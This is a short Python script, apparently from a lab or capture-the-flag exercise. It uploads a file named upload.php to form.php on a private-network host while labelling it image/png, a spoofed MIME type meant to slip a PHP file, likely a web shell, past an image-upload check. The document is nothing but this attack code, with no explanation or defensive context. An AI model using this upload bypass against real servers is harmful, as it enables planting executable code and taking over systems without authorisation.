import requests
url='http://192.168.157.138:8000/form.php'
headers={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183',

}
filepath=r'upload.php'
file={
    'file':(filepath,open(filepath,'rb'),'image/png')
}
response=requests.post(
    url=url,
    headers=headers,
    files=file,
)
print(response.text)
